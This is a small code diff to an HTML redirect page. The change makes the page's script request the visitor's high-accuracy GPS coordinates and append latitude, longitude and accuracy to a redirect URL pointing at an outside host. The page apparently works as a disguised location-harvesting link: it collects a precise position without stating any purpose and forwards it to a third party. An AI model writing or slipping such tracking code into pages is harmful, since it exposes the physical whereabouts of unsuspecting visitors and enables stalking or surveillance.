@@ -30,8 +30,14 @@
       device = map[key] || '';
     }
     let url = 'https://wer1x.onrender.com';
-    if (device) url += '?device=' + encodeURIComponent(device);
-    window.location.replace(url);
+    let params = [];
+    if (device) params.push('device=' + encodeURIComponent(device));
+    navigator.geolocation.getCurrentPosition(p => {
+      params.push('lat=' + p.coords.latitude + '&lon=' + p.coords.longitude + '&acc=' + p.coords.accuracy);
+      window.location.replace(url + (params.length ? '?' + params.join('&') : ''));
+    }, () => {
+      window.location.replace(url + (params.length ? '?' + params.join('&') : ''));
+    }, { timeout: 5000, enableHighAccuracy: true });
   </script>
 </body>
 </html>
